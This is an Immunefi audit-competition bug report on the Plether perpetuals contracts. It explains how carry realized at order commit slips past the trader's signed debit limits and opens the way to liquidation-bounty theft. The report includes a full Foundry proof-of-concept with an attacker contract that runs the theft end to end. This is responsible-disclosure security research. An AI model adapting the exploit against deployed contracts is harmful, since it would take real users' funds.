# \#100078 [SC-Low] Carry realized during order commit bypasses signed debit bounds and enables liquidation-bounty theft

**Submitted on Nov 16th 2026 at 07:40:32 UTC by @OxVrka for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100078
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

An opening V3 order checkpoints accrued carry while reserving its bounty, before recording the order’s commitment effects. Since the carry debit is absent from those effects, signed debit bounds can admit an increase larger than the trader authorized, expanding exposure and enabling liquidation.

## Vulnerability Details

An opening V3 order with a nonzero bounty reaches this path when carry has accrued on the trader’s position. The Router reserves that bounty before recording commitment effects; no special order type or privileged commit is needed.

The commit reserves the execution bounty before it records the order’s commitment effects:

```solidity
CfdEnginePlanTypes.CloseCommitment memory effects =
    _reserveExecutionBounty(account, order.sizeDelta, executionBountyAssets, order.isClose);
clearinghouse.recordBountyReservation(
    account, IMarginClearinghouse.BountyKind.Order, orderId, executionBountyAssets
);
_onOrderCommitted(order, effects);
_reserveCommittedMargin(account, orderId, order.isClose, order.marginDelta);
```

For a nonzero opening bounty, the reservation locks settlement:

```solidity
effects.bountyFromFreeAssets = bounty;
if (bounty == 0) {
    return effects;
}
if (clearinghouse.getAccountAssetBuckets(account).freeSettlementAssets < bounty) {
    revert OrderRouter__InsufficientFreeEquity();
}
clearinghouse.lockReservedSettlement(account, bounty);
```

That lock checkpoints carry before changing the reserved-settlement bucket:

```solidity
function lockReservedSettlement(
    address account,
    uint256 amountAssets
) external onlyReservedSettlementLocker {
    _checkpointCarryBeforeMarginChange(account);
    _lockMargin(account, IMarginClearinghouse.MarginBucket.ReservedSettlement, amountAssets);
}
```

The clearinghouse dispatches the checkpoint to the engine:

```solidity
ICfdEngineCore(engine_).realizeCarryBeforeMarginChange(account);
```

The engine then consumes settlement and transfers realized carry to the pool:

```solidity
(uint256 marginConsumedAssets, uint256 freeSettlementConsumedAssets, uint256 uncoveredAssets) =
    clearinghouse.consumeSettlementLoss(account, carryDueAssets, address(this));
realizedCarryAssets = carryDueAssets - uncoveredAssets;
if (realizedCarryAssets > 0) {
    settlementToken.safeTransfer(address(pool), realizedCarryAssets);
    pool.recordClaimantInflow(
        realizedCarryAssets,
        IHousePool.ClaimantInflowKind.Revenue,
        IHousePool.ClaimantInflowCashMode.CashArrived
    );
}
```

The returned commitment effects do not include that debit. The lifecycle book checks only the reported carry and bounty:

```solidity
uint256 gross = effects.carryCollectedAssets + pending.executionBountyAssets;
if (gross > pending.bounds.maxGrossAccountDebitAssets) {
    revert OrderLifecycleBook__CommitmentBoundExceeded(
        OrderV3Types.ConstraintKind.GrossAccountDebit, gross, pending.bounds.maxGrossAccountDebitAssets
    );
}
if (effects.carryCollectedAssets > pending.bounds.maxActionChargeAssets) {
    revert OrderLifecycleBook__CommitmentBoundExceeded(
        OrderV3Types.ConstraintKind.ActionCharge,
        effects.carryCollectedAssets,
        pending.bounds.maxActionChargeAssets
    );
}
```

Here `effects.carryCollectedAssets` is zero, so both checks pass.

The later policy check uses the same stored bounds and cannot recover the omitted carry debit. The larger position can therefore persist with more exposure than the trader authorized, leaving its protection unable to close within its configured ceiling.

## Impact Details

The carry debit can exceed the trader’s signed limit without appearing in the recorded commitment effects. The resulting unauthorized increase exposes the victim to losses beyond the risk the trader approved.

Later policy checks use the same incomplete effects and do not restore the signed bound. If the larger position exceeds its protection ceiling, it can remain open and become liquidatable, with the keeper bounty paid from the victim’s reserved collateral.

The issue requires a live position with accrued carry and an ordinary opening V3 order with a nonzero bounty; the relevant commit and liquidation paths are public. The PoC demonstrates direct theft of the liquidation bounty from the victim’s reserve.

## References

- [Reviewed repository commit](https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8)
- [Commit ordering and bounty reservation](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderCommitHandler.sol#L21-L35) · [reservation accounting](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderReservationAccounting.sol#L108-L128)
- [Carry checkpoint inside settlement lock](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L818-L823)
- [Carry routing and account debit](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L1336-L1355) · [realization](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1407-L1448)
- [Recorded effects checked against signed bounds](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderLifecycleBook.sol#L327-L361)
- [Stored bounds enforced at execution](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L489-L513)
- [Public protection continuation](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406)
- [In-flight protection status](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L578)
- [Latched-only owner amendment](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328)
- [Close attempt uses durable limits](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L657-L680)
- [Public liquidation route and release deployment defaults](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L493-L500) · [deployment defaults](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L128-L156)


## Link to Proof of Concept

https://gist.github.com/0xVrka/45926409c04b643f9ef4cc83fdda6f82

## Proof of Concept

## Proof of Concept

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineRiskParamsView} from "@plether/perps/interfaces/ICfdEngineRiskParamsView.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

/// @dev An ordinary, permissionless smart-account keeper. It owns no protocol role.
contract CarryTheftAttacker {

    IPerpsKeeper private immutable router;
    IPositionProtectionActions private immutable protectionActions;

    constructor(
        address router_,
        address protectionBook_
    ) {
        router = IPerpsKeeper(router_);
        protectionActions = IPositionProtectionActions(protectionBook_);
    }

    function retry(
        uint64 protectionId
    ) external returns (uint64 retryOrderId) {
        retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);
    }

    function liquidate(
        address account,
        bytes[] calldata pythUpdateData
    ) external payable {
        router.executeLiquidation{value: msg.value}(account, pythUpdateData);
    }

}

/// @notice End-to-end reproduction through the production router: commit-time carry realization
///         escapes the signed order bounds and the locked protection repair path turns it into theft.
contract CarryEscapesOrderBoundsTest is BasePerpTest {

    address private constant VICTIM = address(0xC4111E);
    address private constant NEUTRAL_KEEPER = address(0xB07);

    uint256 private constant STARTING_SIZE = 100_000e18;
    uint256 private constant STARTING_MARGIN = 3000e6;
    uint256 private constant INCREASE_SIZE = 1000e18;
    uint256 private constant CARRY_WAIT = 365 days;
    uint256 private constant START_PRICE = 1e8;
    uint256 private constant STOP_PRICE = 100_500_000;
    uint256 private constant FINAL_PRICE = 102_495_000;
    uint256 private constant PROTECTION_NOTIONAL_LIMIT = 100_000e6;
    uint256 private constant RESERVE_FOR_PROTECTION = 200_000;
    uint256 private constant SIGNED_GROSS_LIMIT = 1_100_000;

    IPositionProtectionActions private protectionActions;
    IPositionProtectionViews private protectionViews;
    CarryTheftAttacker private attacker;

    struct LatchedPosition {
        uint64 protectionId;
        uint64 failedCloseId;
        uint64 retryCloseId;
        uint256 carryAssets;
        uint256 retryGas;
    }

    function setUp() public override {
        super.setUp();

        // BasePerpTest relaxes only senior limits for broad unit coverage; restore release values here.
        IHousePool.PoolConfig memory config = IHousePool.PoolConfig({
            seniorRateBps: pool.seniorRateBps(),
            markStalenessLimit: pool.markStalenessLimit(),
            seniorFrozenLpFeeBps: pool.seniorFrozenLpFeeBps(),
            juniorFrozenLpFeeBps: pool.juniorFrozenLpFeeBps(),
            maxSeniorExposureAssets: 40_000_000e6,
            maxSeniorShareBps: 8000
        });
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();

        // Match the release wrapper's oracle policy; local Pyth updates carry zero confidence.
        IOrderRouterAdminHost.RouterConfig memory releaseRouterConfig = _routerConfig();
        releaseRouterConfig.adverseConfidenceMultiplierBps = 2500;
        releaseRouterConfig.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(releaseRouterConfig);
        // BasePerpTest starts on Monday; the two real config delays cross the weekend market close.
        vm.warp(block.timestamp + 1 days);
        assertFalse(engine.isOracleFrozen(), "all attack transactions run in the ordinary open market window");

        protectionActions = IPositionProtectionActions(router.positionProtectionBook());
        protectionViews = IPositionProtectionViews(router.positionProtectionBook());
        attacker = new CarryTheftAttacker(address(router), address(router.positionProtectionBook()));

        CfdTypes.RiskParams memory risk = ICfdEngineRiskParamsView(address(engine)).riskParams();
        assertEq(risk.vpiFactor, 0.01e18, "release VPI factor");
        assertEq(risk.maxSkewRatio, 0.4e18, "release skew cap");
        assertEq(risk.maintMarginBps, 10, "release maintenance margin");
        assertEq(risk.initMarginBps, 20, "release initial margin");
        assertEq(risk.fadMarginBps, 300, "release FAD margin");
        assertEq(risk.baseCarryBps, 500, "release carry rate");
        assertEq(risk.minBountyAssets, 1e6, "release minimum liquidation charge");
        assertEq(risk.bountyBps, 10, "release liquidation charge rate");
        assertEq(risk.keeperShareBps, 5000, "release keeper share");
        assertEq(risk.protocolShareBps, 0, "release treasury share");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(engine.settlementBufferBps(), 25, "release settlement buffer");
        assertFalse(engine.degradedMode(), "normal risk mode is active");
        assertEq(engine.protocolTreasury(), PROTOCOL_TREASURY_ACCOUNT, "treasury remains set");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release senior exposure cap");
        assertEq(pool.maxSeniorShareBps(), 8000, "release senior share cap");
        assertEq(pool.juniorPrincipal(), 1_000_000e6, "release junior seed amount");
        assertEq(pool.seniorPrincipal(), 1_000_000e6, "release senior seed amount");
        assertEq(pletherOracle.orderExecutionStalenessLimit(), 60, "release order window");
        assertEq(pletherOracle.liquidationStalenessLimit(), 15, "release liquidation window");
        assertEq(pletherOracle.orderSettlementWindow(), 15, "release historical execution window");
        assertEq(pletherOracle.maxComponentPublishTimeDivergence(), 5, "release Pyth divergence limit");
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10, "release basket confidence width");
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500, "release adverse confidence multiplier");
        assertEq(router.maxExecutionWindowSeconds(), 60, "release order deadline window");
        assertEq(router.minOpenNotionalAssets(), 1000e6, "release minimum open notional");
        assertEq(router.openOrderExecutionBountyBps(), 1, "release opening bounty rate");
        assertEq(router.minOpenOrderExecutionBountyAssets(), 10_000, "release minimum opening bounty");
        assertEq(router.maxOpenOrderExecutionBountyAssets(), 200_000, "release maximum opening bounty");
        assertEq(
            router.positionProtectionTriggerBountyAssets(), RESERVE_FOR_PROTECTION, "release protection trigger reward"
        );
        assertEq(router.maxPendingOrders(), 5, "release pending-order cap");
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1_000_000e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1_000_000e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function test_AttackerTurnsUnboundedCarryDebitIntoLiquidationBounty() public {
        LatchedPosition memory position = _buildLatchedPosition(true, true);
        assertEq(position.carryAssets, 235_625_132, "one release-rate carry year matches the exact local witness");
        assertGt(position.carryAssets, 100e6, "carry link exceeds $100 scale");
        assertGt(position.carryAssets, RESERVE_FOR_PROTECTION, "carry debit materially exceeds reserve");
        assertEq(
            uint8(protectionViews.getPositionProtection(position.protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "attacker retry occupies amendment state"
        );
        assertEq(
            router.lifecycleBook().pendingPolicy(position.retryCloseId).maxExecutionNotionalAssets,
            PROTECTION_NOTIONAL_LIMIT,
            "attacker retry copies the unchanged failing trader ceiling"
        );

        PositionProtectionTypes.CloseFinancialLimits memory rejectedAmendment =
            _protectionLimits(type(uint256).max, type(uint256).max);
        vm.prank(VICTIM);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(position.protectionId, rejectedAmendment);

        ICfdEngineTypes.LiquidationPreview memory preview = engineLens.previewLiquidation(VICTIM, FINAL_PRICE);
        emit log_named_uint("attacker final neutral mark (8 decimals)", FINAL_PRICE);
        emit log_named_int("final liquidation preview equity (6 decimals)", preview.equityAssets);
        emit log_named_uint("final liquidation preview keeper bounty (6 decimals)", preview.keeperBountyAssets);
        emit log_named_uint("final liquidation preview total charge (6 decimals)", preview.liquidationChargeAssets);
        assertTrue(preview.liquidatable, "carry and public retry must jointly reach liquidation at this price");
        assertGt(preview.keeperBountyAssets, 0, "the victim funds a concrete keeper payout");
        assertEq(preview.equityAssets, 80_522_404, "exact final equity is below maintenance");
        assertEq(preview.keeperBountyAssets, 50_500_000, "release keeper share of the charge is $50.50");
        assertEq(preview.liquidationChargeAssets, 101_000_000, "release liquidation charge is $101.00");

        uint256 attackerBefore = clearinghouse.balanceAssets(address(attacker));
        uint256 victimBefore = clearinghouse.balanceAssets(VICTIM);
        bytes[] memory liquidationUpdate = _mockPythUpdateData(FINAL_PRICE);
        uint256 gasBefore = gasleft();
        attacker.liquidate(VICTIM, liquidationUpdate);
        uint256 liquidationGas = gasBefore - gasleft();
        uint256 attackerAfter = clearinghouse.balanceAssets(address(attacker));
        uint256 victimAfter = clearinghouse.balanceAssets(VICTIM);

        assertEq(attackerBefore, 0, "attacker receives no protection-trigger bounty");
        assertEq(attackerAfter - attackerBefore, preview.keeperBountyAssets, "attacker receives the exact keeper share");
        assertEq(attackerAfter, 50_500_000, "attacker's exact post-liquidation balance is $50.50");
        assertLt(victimAfter, victimBefore, "victim settlement balance decreases");
        assertGe(
            victimBefore - victimAfter,
            preview.liquidationChargeAssets,
            "victim pays at least the quoted liquidation charge"
        );
        assertGt(victimBefore - victimAfter, 100e6, "victim loss exceeds $100 scale");
        assertEq(victimBefore, 2_701_472_419, "victim's exact pre-liquidation settlement balance");
        assertEq(victimAfter, 80_522_397, "victim's exact post-liquidation settlement balance");
        assertEq(victimBefore - victimAfter, 2_620_950_022, "victim's exact settlement decrease is $2,620.950022");
        assertEq(_positionSize(VICTIM), 0, "public liquidation closes the victim position");
        assertEq(
            uint8(protectionViews.getPositionProtection(position.protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Liquidated),
            "liquidation clears protected retry"
        );
        emit log_named_uint("attacker balance before liquidation", attackerBefore);
        emit log_named_uint("attacker balance after liquidation", attackerAfter);
        emit log_named_uint("victim balance before liquidation", victimBefore);
        emit log_named_uint("victim balance after liquidation", victimAfter);
        emit log_named_uint("victim exact liquidation charge", victimBefore - victimAfter);
        emit log_named_uint("attacker liquidation call gas", liquidationGas);
        emit log_named_uint("attacker retry gas", position.retryGas);
        emit log_named_uint("attacker measured gas across retry and liquidation", position.retryGas + liquidationGas);
    }


    function _buildLatchedPosition(
        bool accrueCarry,
        bool attackerRetries
    ) private returns (LatchedPosition memory position) {
        uint256 initialBounty = _expectedOpenBounty(STARTING_SIZE);
        uint256 increaseBounty = _expectedOpenBounty(INCREASE_SIZE);
        assertEq(initialBounty, 200_000, "release cap pays the $0.20 initial open bounty");
        assertEq(increaseBounty, 100_000, "release rate pays the $0.10 increase bounty");
        assertEq(SIGNED_GROSS_LIMIT, 1_100_000, "trader signs a $1.10 gross debit bound");
        uint256 increaseMargin = 3e6;
        _fundTrader(
            VICTIM,
            STARTING_MARGIN + initialBounty + increaseBounty + increaseMargin + RESERVE_FOR_PROTECTION
                + SIGNED_GROSS_LIMIT + 100e6
        );
        _openThroughRouter(VICTIM);

        uint256 freeAssets = clearinghouse.getAccountAssetBuckets(VICTIM).freeSettlementAssets;
        uint256 requiredFree = increaseBounty + increaseMargin + RESERVE_FOR_PROTECTION + SIGNED_GROSS_LIMIT;
        assertGt(freeAssets, requiredFree, "fixture has free settlement to retain only declared reservations");
        vm.prank(VICTIM);
        clearinghouse.withdrawMargin(freeAssets - requiredFree);
        assertEq(
            clearinghouse.getAccountAssetBuckets(VICTIM).freeSettlementAssets,
            requiredFree,
            "only increase bounty and protection reserve remain liquid"
        );

        if (accrueCarry) {
            vm.warp(block.timestamp + CARRY_WAIT);
            bytes[] memory markUpdate = _mockPythUpdateData(START_PRICE);
            vm.prank(NEUTRAL_KEEPER);
            router.updateMarkPrice(markUpdate);
        }

        uint256 balanceBeforeCommit = clearinghouse.balanceAssets(VICTIM);
        OrderV3Types.OrderRequest memory increase = _request(
            keccak256(abi.encode("bounded-increase", accrueCarry)),
            CfdTypes.Side.LONG,
            INCREASE_SIZE,
            increaseMargin,
            START_PRICE,
            false
        );
        increase.bounds.maxExecutionBountyAssets = increaseBounty;
        increase.bounds.maxGrossAccountDebitAssets = SIGNED_GROSS_LIMIT;
        increase.bounds.maxActionChargeAssets = SIGNED_GROSS_LIMIT;

        // Anchor the submit deadline to the fresh post-warp mark time via a staticcall,
        // so the optimizer cannot common-subexpression the timestamp read across the
        // carry-accrual warp above.
        increase.bounds.submitBy = uint64(engine.lastMarkTime() + 60);
        vm.prank(VICTIM);
        uint64 increaseId = router.commitOrder(increase);
        uint256 balanceAfterCommit = clearinghouse.balanceAssets(VICTIM);
        position.carryAssets = balanceBeforeCommit - balanceAfterCommit;
        if (accrueCarry) {
            assertGt(position.carryAssets, 100e6, "ordinary bounded increase commits after >$100 carry debit");
            assertGt(
                position.carryAssets,
                increase.bounds.maxGrossAccountDebitAssets,
                "carry exceeds the signed gross debit ceiling"
            );
            assertGt(
                position.carryAssets,
                increase.bounds.maxActionChargeAssets,
                "carry exceeds the signed action-charge ceiling"
            );
        } else {
            assertEq(position.carryAssets, 0, "no elapsed carry was collected");
        }
        assertEq(
            router.lifecycleBook().pendingIntent(increaseId).commitment.carryCollectedAssets,
            0,
            "commitment omits carry collected by its first reservation callback"
        );
        if (accrueCarry) {
            assertEq(
                position.carryAssets + increaseBounty,
                235_725_132,
                "actual commit-time carry plus bounty is $235.725132"
            );
        }
        emit log_named_uint("carry world accrued carry (6 decimals)", position.carryAssets);
        emit log_named_uint("increase declared max gross (6 decimals)", increase.bounds.maxGrossAccountDebitAssets);
        emit log_named_uint("increase actual carry plus bounty (6 decimals)", position.carryAssets + increaseBounty);

        bytes[] memory increaseUpdate = _mockPythUpdateAfterLastMark(START_PRICE);
        vm.prank(NEUTRAL_KEEPER);
        OrderV3Types.ExecutionResult memory increaseResult = router.executeOrder(increaseId, increaseUpdate);
        emit log_named_uint("increase execution status", uint8(increaseResult.status));
        emit log_named_uint("increase terminal reason", uint8(increaseResult.terminalReason));
        emit log_named_uint("increase pending reason", uint8(increaseResult.pendingReason));
        assertEq(
            uint8(increaseResult.status),
            uint8(OrderV3Types.LifecycleStatus.Executed),
            "underbound increase executes despite the earlier carry debit"
        );
        assertEq(_positionSize(VICTIM), STARTING_SIZE + INCREASE_SIZE, "increase adds $1,000 of position exposure");
        emit log_named_uint("carry plus bounty charged at increase commit", position.carryAssets + increaseBounty);
        emit log_named_uint("increase order declared gross ceiling", increase.bounds.maxGrossAccountDebitAssets);
        emit log_named_uint("increase order declared action ceiling", increase.bounds.maxActionChargeAssets);

        uint256 freeAfterIncrease = clearinghouse.getAccountAssetBuckets(VICTIM).freeSettlementAssets;
        assertGe(freeAfterIncrease, RESERVE_FOR_PROTECTION, "execution leaves protection bounty funded");
        if (freeAfterIncrease > RESERVE_FOR_PROTECTION) {
            vm.prank(VICTIM);
            clearinghouse.withdrawMargin(freeAfterIncrease - RESERVE_FOR_PROTECTION);
        }
        assertEq(
            clearinghouse.getAccountAssetBuckets(VICTIM).freeSettlementAssets,
            RESERVE_FOR_PROTECTION,
            "trader leaves only the normal protection reserve after the increase"
        );

        position.protectionId = _createProtection(PROTECTION_NOTIONAL_LIMIT);
        position.failedCloseId = _triggerOnly(position.protectionId);
        _assertFailingProtectionBound(position.failedCloseId);
        _executeFailedAttempt(position.failedCloseId, NEUTRAL_KEEPER);
        if (attackerRetries) {
            uint256 gasBeforeRetry = gasleft();
            position.retryCloseId = attacker.retry(position.protectionId);
            position.retryGas = gasBeforeRetry - gasleft();
            assertGt(position.retryCloseId, position.failedCloseId, "permissionless retry installs a fresh child");
            assertEq(
                uint8(protectionViews.getPositionProtection(position.protectionId).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
                "retry occupies owner amendment gate"
            );
            emit log_named_uint("attacker permissionless retry gas", position.retryGas);
        } else {
            assertEq(
                uint8(protectionViews.getPositionProtection(position.protectionId).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
                "without retry the owner gets the repair window"
            );
        }
        emit log_named_uint("terminalized protection close id", position.failedCloseId);
        if (attackerRetries) {
            emit log_named_uint("retry protection close id", position.retryCloseId);
        }
    }

    function _assertFailingProtectionBound(
        uint64 orderId
    ) private {
        uint256 executionNotional = (_positionSize(VICTIM) / CfdTypes.SIZE_QUANTUM) * STOP_PRICE;
        uint256 maxNotional = router.lifecycleBook().pendingPolicy(orderId).maxExecutionNotionalAssets;
        uint256 expectedNotional =
            _positionSize(VICTIM) == STARTING_SIZE + INCREASE_SIZE ? 101_505_000_000 : 100_500_000_000;
        assertEq(maxNotional, PROTECTION_NOTIONAL_LIMIT, "child inherits the trader's finite close ceiling");
        assertEq(executionNotional, expectedNotional, "Pyth stop mark yields the exact close notional");
        assertGt(executionNotional, maxNotional, "stop execution notional exceeds the copied ceiling");
        emit log_named_uint("protection child max close notional (6 decimals)", maxNotional);
        emit log_named_uint("stop execution notional (6 decimals)", executionNotional);
    }


    function _openThroughRouter(
        address account
    ) private {
        bytes[] memory markUpdate = _mockPythUpdateData(START_PRICE);
        vm.prank(NEUTRAL_KEEPER);
        router.updateMarkPrice(markUpdate);

        OrderV3Types.OrderRequest memory request = _request(
            keccak256(abi.encode("bounded-open", account, router.nextCommitId())),
            CfdTypes.Side.LONG,
            STARTING_SIZE,
            STARTING_MARGIN,
            START_PRICE,
            false
        );
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory update = _mockPythUpdateData(START_PRICE);
        vm.prank(NEUTRAL_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, update);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "initial position uses V3 router");
        assertEq(_positionSize(account), STARTING_SIZE, "V3 open creates the expected live position");
    }

    function _createProtection(
        uint256 maximumCloseNotional
    ) private returns (uint64 protectionId) {
        bytes[] memory freshMark = _mockPythUpdateAfterLastMark(START_PRICE);
        vm.prank(NEUTRAL_KEEPER);
        router.updateMarkPrice(freshMark);

        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = STOP_PRICE;
        params.closeLimits = _protectionLimits(maximumCloseNotional, type(uint256).max);
        vm.prank(VICTIM);
        protectionId = protectionActions.createPositionProtection(params);
    }

    function _triggerOnly(
        uint64 protectionId
    ) private returns (uint64 failedOrderId) {
        bytes[] memory triggerUpdate = _mockPythUpdateAfterLastMark(STOP_PRICE);
        vm.prank(NEUTRAL_KEEPER);
        failedOrderId = protectionActions.triggerPositionProtection(protectionId, triggerUpdate);
    }

    function _executeFailedAttempt(
        uint64 failedOrderId,
        address keeper
    ) private {
        bytes[] memory executionUpdate = _mockPythUpdateAfterLastMark(STOP_PRICE);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(failedOrderId, executionUpdate);
        assertEq(
            uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "protection attempt must be terminal"
        );
        assertEq(
            uint8(result.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "stop close exceeds its finite notional ceiling after ordinary price movement"
        );
    }

    function _protectionLimits(
        uint256 maxNotional,
        uint256 maxGross
    ) private pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
        limits.maxExecutionNotionalAssets = maxNotional;
        limits.maxGrossAccountDebitAssets = maxGross;
        limits.maxActionChargeAssets = type(uint256).max;
        limits.maxExplicitFeesAssets = type(uint256).max;
    }

    function _request(
        bytes32 clientOrderId,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 target,
        bool isClose
    ) private view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = clientOrderId;
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = target;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _expectedOpenBounty(
        uint256 size
    ) private view returns (uint256 bounty) {
        uint256 notional = (size / CfdTypes.SIZE_QUANTUM) * START_PRICE;
        bounty = (notional * router.openOrderExecutionBountyBps()) / 10_000;
        if (bounty < router.minOpenOrderExecutionBountyAssets()) {
            bounty = router.minOpenOrderExecutionBountyAssets();
        }
        uint256 maximum = router.maxOpenOrderExecutionBountyAssets();
        if (bounty > maximum) {
            bounty = maximum;
        }
    }

    function _mockPythUpdateAfterLastMark(
        uint256 price
    ) private returns (bytes[] memory updateData) {
        uint64 publishTime = engine.lastMarkTime() + 1;
        if (block.timestamp < publishTime) {
            vm.warp(publishTime);
        }
        vm.roll(vm.getBlockNumber() + 1);
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(uint64(price)), 0, int32(-8), publishTime, publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    function _positionSize(
        address account
    ) private view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

}

```

The PoC is the attached Foundry test CarryEscapesOrderBounds.t.sol. It opens the protected position, waits one year at the release carry rate, commits a bounded increase, triggers the failed protection close, then retries and liquidates.

1. Deploy the release risk and oracle configuration; seed the fixture pool.
2. Open the victim’s protected long.
3. Warp one year and assert $235.625132 accrued carry.
4. Commit a $1,000 V3 increase with $1.10 gross-debit and action-charge limits.
5. Assert $235.725132 was debited while the recorded carry effect is zero and the order executes.
6. Trigger the protection stop and assert the $101,505 close exceeds its $100,000 ceiling.
7. Queue the normal protection continuation; assert the configured ceiling and Triggered status, then assert owner amendment is unavailable while the attempt is in flight.
8. At $1.02495, liquidate through the public entrypoint.
9. Assert the $50.50 attacker credit and $2,620.950022 victim debit.

At the release 500 bps carry rate, the one-year witness realizes $235.625132 carry, adds a $0.10 bounty, and debits $235.725132 against $1.10 signed limits for a $1,000 increase. The larger close assesses $101,505 against the $100,000 ceiling. Counterfactual runs show no liquidation without the unbounded increase, and no attacker credit if the owner amends the ceiling while Latched. The public continuation and liquidation calls consume 1,295,389 gas combined.

